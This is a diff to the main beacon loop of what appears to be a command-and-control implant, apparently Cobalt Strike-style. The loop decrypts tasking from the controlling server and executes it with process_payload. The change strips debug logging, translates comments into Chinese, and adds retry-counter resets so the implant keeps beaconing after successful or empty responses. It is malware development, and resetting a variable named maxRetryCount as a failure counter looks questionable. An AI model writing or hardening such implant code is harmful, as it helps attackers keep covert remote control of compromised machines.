@@ -170,25 +170,22 @@ void beacon(LPVOID lpReserved) {
 		/* 这是在处理之前解密和验证有效载荷的适当时机 */
 		if (length > 0) {
 			/* 解密缓冲区 */
-			// dlog("beacon.beacon - Decrypting payload length : %d \n", length);
 			length = security_decrypt(buffer, length);
 			if (length > 0) {
-				// dlog("beacon.beacon - Response decrypted length: %d \n", length);
 				process_payload(buffer, length);
+				// 重置失败计数器，因为成功处理了响应
+				maxRetryCount = 0;
 			} else {
-			    // CS-327: We were unable to decrypt/process the payload...
-			    //         Consider as failed for host rotation...
-	    		// dlog("beacon.beacon - Failed 200 response. Decrypted payload length = 0.\n");
-	    		length = -1;
-		    	failedHost = TRUE;
+				// 解密失败，标记为主机失败
+				length = -1;
+				failedHost = TRUE;
 			}
 		}
-		// else {
-			// 0 = standard 'nothing to do' response.
-			// -1 = host failure.
-			// anything else = wtf?
-			// dlog("beacon.beacon - Response length = %d \n", length);
-		// }
+		else if (length == 0) {
+			// 标准的"无事可做"响应 - 重置失败计数
+			maxRetryCount = 0;
+		}
+		// length == -1 表示主机失败，保持failedHost = TRUE
 
 		/* 如果发生故障则返回-1，连接失败时不执行POST */
 		if (length != -1) {
